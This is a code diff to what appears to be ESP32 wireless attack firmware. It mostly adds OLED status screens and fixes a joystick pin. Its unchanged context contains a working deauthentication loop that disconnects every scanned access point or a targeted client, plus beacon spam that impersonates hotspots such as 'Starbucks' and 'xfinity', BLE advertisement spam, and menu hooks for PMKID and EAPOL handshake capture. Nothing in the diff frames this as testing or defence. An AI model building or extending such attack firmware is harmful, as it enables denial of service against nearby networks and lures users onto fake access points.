@@ -44,7 +44,10 @@
 
 #define JOY_X     36
 #define JOY_Y     39
-#define JOY_SW    34
+// NOTE: GPIO34-39 are input-only and don't support internal pull-ups.
+// Changed to GPIO26 which supports INPUT_PULLUP for reliable button detection.
+// If using original GPIO34, an external pull-up resistor (10kΩ to 3.3V) is required.
+#define JOY_SW    26
 
 #define MAX_APS 100
 #define SERIAL_SPEED 115200
@@ -129,6 +132,13 @@ void wifi_send_packet(uint8_t* buf, int len, uint8_t channel) {
 
 void wifi_scan_aps() {
   Serial.println(F("Starting AP Scan..."));
+  display.clearDisplay();
+  display.setTextSize(1);
+  display.setTextColor(SSD1306_WHITE);
+  display.setCursor(0, 0);
+  display.println(F("Scanning APs..."));
+  display.display();
+  
   ap_count = WiFi.scanNetworks(false, true, false, 100);
   for (int i = 0; i < ap_count && i < MAX_APS; i++) {
     ap_list[i].ssid = WiFi.SSID(i);
@@ -136,15 +146,63 @@ void wifi_scan_aps() {
     ap_list[i].channel = WiFi.channel(i);
     memcpy(ap_list[i].bssid, WiFi.BSSID(i), 6);
   }
+  
+  // Display results
+  display.clearDisplay();
+  display.setCursor(0, 0);
+  display.print(F("Found: "));
+  display.print(ap_count);
+  display.println(F(" APs"));
+  display.drawLine(0, 10, SCREEN_WIDTH, 10, SSD1306_WHITE);
+  
+  // Show first few APs
+  for (int i = 0; i < min(4, ap_count); i++) {
+    display.setCursor(0, 14 + i * 12);
+    display.print(ap_list[i].ssid.substring(0, 14));
+    display.print(F(" "));
+    display.print(ap_list[i].rssi);
+  }
+  display.display();
+  Serial.print(F("Found "));
+  Serial.print(ap_count);
+  Serial.println(F(" APs"));
 }
 
 void wifi_scan_stations() {
   Serial.println(F("Starting Station Scan..."));
-  // Promiscuous mode logic handled in callback
+  Serial.println(F("Enabling promiscuous mode for station detection"));
+  display.clearDisplay();
+  display.setTextSize(1);
+  display.setTextColor(SSD1306_WHITE);
+  display.setCursor(0, 0);
+  display.println(F("STATION SCAN"));
+  display.println(F("Promiscuous mode"));
+  display.println(F("enabled. Check"));
+  display.println(F("Serial for clients"));
+  display.display();
+  esp_wifi_set_promiscuous(true);
+  // Station detection happens in sniffer_callback
 }
 
 void wifi_deauth_broadcast() {
   Serial.println(F("Executing Deauth Broadcast..."));
+  display.clearDisplay();
+  display.setTextSize(1);
+  display.setTextColor(SSD1306_WHITE);
+  display.setCursor(0, 0);
+  display.println(F("DEAUTH BROADCAST"));
+  display.print(F("Targeting: "));
+  display.print(ap_count);
+  display.println(F(" APs"));
+  display.display();
+  
+  if (ap_count == 0) {
+    display.println(F("No APs! Scan first"));
+    display.display();
+    Serial.println(F("No APs scanned. Run WiFi Scan AP first."));
+    return;
+  }
+  
   for (int i = 0; i < ap_count; i++) {
     memcpy(deauth_template + 10, ap_list[i].bssid, 6);
     memcpy(deauth_template + 16, ap_list[i].bssid, 6);
@@ -153,15 +211,27 @@ void wifi_deauth_broadcast() {
       delay(1);
     }
   }
+  display.println(F("Deauth sent!"));
+  display.display();
 }
 
 void wifi_deauth_target(uint8_t* mac) {
   Serial.println(F("Executing Targeted Deauth..."));
+  display.clearDisplay();
+  display.setTextSize(1);
+  display.setTextColor(SSD1306_WHITE);
+  display.setCursor(0, 0);
+  display.println(F("TARGETED DEAUTH"));
+  display.display();
+  
   if (ap_count > 0) {
      memcpy(deauth_template + 4, mac, 6);
      memcpy(deauth_template + 10, ap_list[0].bssid, 6);
      memcpy(deauth_template + 16, ap_list[0].bssid, 6);
      wifi_send_packet(deauth_template, sizeof(deauth_template), ap_list[0].channel);
+     display.println(F("Deauth sent to"));
+     display.println(ap_list[0].ssid.substring(0, 16));
+     display.display();
   }
 }
 
@@ -183,8 +253,18 @@ void wifi_beacon_spam_custom(const char* ssid) {
 
 void wifi_beacon_spam_list() {
   Serial.println(F("Beacon Spam (List)..."));
+  display.clearDisplay();
+  display.setTextSize(1);
+  display.setTextColor(SSD1306_WHITE);
+  display.setCursor(0, 0);
+  display.println(F("BEACON SPAM"));
+  display.println(F("Broadcasting:"));
+  display.display();
+  
   const char* ssids[] = {"Free WiFi", "Starbucks", "xfinity", "Marauder_Ghst"};
   for (int i = 0; i < 4; i++) {
+    display.println(ssids[i]);
+    display.display();
     wifi_beacon_spam_custom(ssids[i]);
     delay(10);
   }
@@ -193,11 +273,26 @@ void wifi_beacon_spam_list() {
 void wifi_beacon_spam_random() {
   Serial.println(F("Beacon Spam (Random)..."));
   String rs = "WiFi-" + String(random(1000, 9999));
+  display.clearDisplay();
+  display.setTextSize(1);
+  display.setTextColor(SSD1306_WHITE);
+  display.setCursor(0, 0);
+  display.println(F("RANDOM BEACON"));
+  display.println(F("Broadcasting:"));
+  display.println(rs);
+  display.display();
   wifi_beacon_spam_custom(rs.c_str());
 }
 
 void wifi_rickroll() {
   Serial.println(F("Rickroll Beacon Spam..."));
+  display.clearDisplay();
+  display.setTextSize(1);
+  display.setTextColor(SSD1306_WHITE);
+  display.setCursor(0, 0);
+  display.println(F("RICKROLL"));
+  display.println(F("Broadcasting:"));
+  display.display();
   const char* lyrics[] = {"Never Gonna", "Give You Up", "Never Gonna", "Let You Down"};
   for (int i = 0; i < 4; i++) {
     wifi_beacon_spam_custom(lyrics[i]);
@@ -207,21 +302,80 @@ void wifi_rickroll() {
 
 void wifi_probe_spam() {
   Serial.println(F("Probe Spam..."));
-  // Simplified placeholder
+  display.clearDisplay();
+  display.setTextSize(1);
+  display.setTextColor(SSD1306_WHITE);
+  display.setCursor(0, 0);
+  display.println(F("PROBE SPAM"));
+  display.println(F("Sending probes..."));
+  display.println(F("(placeholder)"));
+  display.display();
+  // TODO: Implement probe request spam
 }
 
-// --- BLUETOOT TOOLS ---
+// --- BLUETOOTH TOOLS ---
 void bluetooth_ble_scan() {
   Serial.println(F("Starting BLE Scan..."));
-  pBLEScan->start(5, false);
+  display.clearDisplay();
+  display.setTextSize(1);
+  display.setTextColor(SSD1306_WHITE);
+  display.setCursor(0, 0);
+  display.println(F("BLE Scanning..."));
+  display.println(F("(5 seconds)"));
+  display.display();
+  
+  BLEScanResults foundDevices = pBLEScan->start(5, false);
+  int count = foundDevices.getCount();
+  
+  display.clearDisplay();
+  display.setCursor(0, 0);
+  display.print(F("Found: "));
+  display.print(count);
+  display.println(F(" devices"));
+  display.drawLine(0, 10, SCREEN_WIDTH, 10, SSD1306_WHITE);
+  
+  // Show first few devices
+  for (int i = 0; i < min(4, count); i++) {
+    BLEAdvertisedDevice device = foundDevices.getDevice(i);
+    display.setCursor(0, 14 + i * 12);
+    if (device.haveName()) {
+      display.print(device.getName().substring(0, 16).c_str());
+    } else {
+      display.print(F("[Unknown]"));
+    }
+  }
+  display.display();
+  Serial.print(F("Found "));
+  Serial.print(count);
+  Serial.println(F(" BLE devices"));
+  pBLEScan->clearResults();
 }
 
 void bluetooth_bt_classic_scan() {
   Serial.println(F("BT Classic Scan (Stub)..."));
+  display.clearDisplay();
+  display.setTextSize(1);
+  display.setTextColor(SSD1306_WHITE);
+  display.setCursor(0, 0);
+  display.println(F("BT CLASSIC SCAN"));
+  display.println(F("Not implemented"));
+  display.println(F("ESP32 BT Classic"));
+  display.println(F("requires extra"));
+  display.println(F("configuration"));
+  display.display();
 }
 
 void bluetooth_ble_spam() {
   Serial.println(F("Starting BLE Spam..."));
+  display.clearDisplay();
+  display.setTextSize(1);
+  display.setTextColor(SSD1306_WHITE);
+  display.setCursor(0, 0);
+  display.println(F("BLE ADVERTISING"));
+  display.println(F("Broadcasting:"));
+  display.println(F("Marauder-Spam"));
+  display.display();
+  
   BLEAdvertising *pAdvertising = BLEDevice::getAdvertising();
   BLEAdvertisementData oAdvertisementData;
   oAdvertisementData.setFlags(0x06); 
@@ -230,6 +384,9 @@ void bluetooth_ble_spam() {
   pAdvertising->start();
   delay(100);
   pAdvertising->stop();
+  
+  display.println(F("Done!"));
+  display.display();
 }
 
 // --- SNIFFER ---
@@ -246,16 +403,43 @@ void sniffer_callback(void* buf, wifi_promiscuous_pkt_type_t type) {
 
 void sniffing_start_raw_capture() {
   Serial.println(F("Raw Capture Started..."));
+  display.clearDisplay();
+  display.setTextSize(1);
+  display.setTextColor(SSD1306_WHITE);
+  display.setCursor(0, 0);
+  display.println(F("RAW SNIFFING"));
+  display.println(F("Active..."));
+  display.println(F("Check Serial for"));
+  display.println(F("captured packets"));
+  display.display();
   esp_wifi_set_promiscuous(true);
 }
 
 void sniffing_capture_pmkid() {
   Serial.println(F("PMKID Capture..."));
+  display.clearDisplay();
+  display.setTextSize(1);
+  display.setTextColor(SSD1306_WHITE);
+  display.setCursor(0, 0);
+  display.println(F("PMKID CAPTURE"));
+  display.println(F("Listening..."));
+  display.println(F("Check Serial for"));
+  display.println(F("PMKID hashes"));
+  display.display();
   esp_wifi_set_promiscuous(true);
 }
 
 void sniffing_capture_eapol() {
   Serial.println(F("EAPOL Capture..."));
+  display.clearDisplay();
+  display.setTextSize(1);
+  display.setTextColor(SSD1306_WHITE);
+  display.setCursor(0, 0);
+  display.println(F("EAPOL CAPTURE"));
+  display.println(F("Listening..."));
+  display.println(F("Check Serial for"));
+  display.println(F("handshakes"));
+  display.display();
   esp_wifi_set_promiscuous(true);
 }
 
@@ -331,8 +515,9 @@ void ui_select_item() {
 void setup() {
   Serial.begin(SERIAL_SPEED);
   
-  // Joystick Button Input (GPIO34 is input-only on ESP32)
-  pinMode(JOY_SW, INPUT);
+  // Joystick Button Input - Use INPUT_PULLUP for reliable detection
+  // Button reads LOW when pressed, HIGH when released
+  pinMode(JOY_SW, INPUT_PULLUP);
   
   // OLED Init
   if(!display.begin(SSD1306_SWITCHCAPVCC)) { 
